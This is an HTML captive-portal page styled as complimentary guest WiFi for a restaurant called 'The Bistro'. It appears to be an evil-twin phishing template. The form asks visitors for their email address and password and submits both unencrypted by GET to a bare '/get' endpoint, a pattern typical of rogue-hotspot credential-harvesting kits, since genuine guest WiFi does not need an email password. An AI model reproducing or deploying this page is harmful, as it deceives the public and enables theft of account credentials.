<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>The Bistro — Guest WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Georgia,"Times New Roman",serif;background:#0c0a08;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:390px;background:#12100d;border:1px solid #2a2218;border-radius:8px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,0.6)}
.gold-line{height:1px;background:linear-gradient(90deg,transparent,#C4A050,transparent)}
.top{padding:32px 30px 26px;text-align:center}
.bistro-name{font-size:26px;font-weight:400;color:#e8d8b0;letter-spacing:4px;font-style:italic}
.bistro-sub{font-size:9px;color:#6a5a3a;letter-spacing:3px;text-transform:uppercase;margin-top:8px;font-family:-apple-system,sans-serif}
.gold-line-2{height:1px;background:linear-gradient(90deg,transparent,#C4A05060,transparent);margin:16px 0}
.ssid-row{display:flex;align-items:center;justify-content:center;gap:7px}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.ssid-row span{font-size:10px;color:#4a3a20;font-family:-apple-system,sans-serif;letter-spacing:0.5px}
.ssid-row strong{color:#7a6040;font-weight:500}
.divider{height:1px;background:#2a2218;margin:0}
.body{padding:28px 30px 22px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
.body h2{font-size:15px;font-weight:600;color:#c0a878;margin-bottom:4px;letter-spacing:0.3px}
.body .sub{font-size:12px;color:#5a4a28;margin-bottom:20px}
.lbl{display:block;font-size:9.5px;font-weight:600;text-transform:uppercase;letter-spacing:1.5px;color:#5a4a28;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:11px 0;border:none;border-bottom:1px solid #2a2218;background:transparent;font-size:14px;color:#c0a878;outline:none}
input:focus{border-bottom-color:#C4A050}
input::placeholder{color:#2a2218}
.btn{width:100%;padding:13px;margin-top:26px;border:1px solid #C4A050;background:transparent;color:#C4A050;font-size:10px;font-weight:600;letter-spacing:3px;text-transform:uppercase;cursor:pointer;transition:all .2s;font-family:-apple-system,sans-serif}
.btn:hover{background:#C4A050;color:#0c0a08}
.terms{font-size:10px;color:#3a2a10;text-align:center;margin-top:18px;line-height:1.7;font-family:-apple-system,sans-serif}
.terms a{color:#6a5a3a}
.foot{border-top:1px solid #2a2218;padding:12px 30px;display:flex;justify-content:space-between;font-family:-apple-system,sans-serif}
.foot span,.foot a{font-size:9.5px;color:#3a2a10;letter-spacing:1px;text-transform:uppercase;text-decoration:none}
.foot a{color:#6a5a3a}
</style>
</head>
<body>
<div class="card">
  <div class="gold-line"></div>
  <div class="top">
    <div class="bistro-name">The Bistro</div>
    <div class="bistro-sub">Farm to Table &bull; Est. 2012</div>
    <div class="gold-line-2"></div>
    <div class="ssid-row"><div class="dot"></div><span>Network: <strong>TheBistro-Guest</strong></span></div>
  </div>
  <div class="divider"></div>
  <div class="body">
    <h2>Complimentary WiFi</h2>
    <p class="sub">Sign in to enjoy our guest network during your dining experience.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="your@email.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="••••••••" required>
      <button type="submit" class="btn">Connect</button>
      <p class="terms">By connecting you agree to our <a href="#">guest internet policy</a>.</p>
    </form>
  </div>
  <div class="gold-line"></div>
  <div class="foot"><span>The Bistro Restaurant</span><a href="#">Help</a></div>
</div>
</body>
</html>
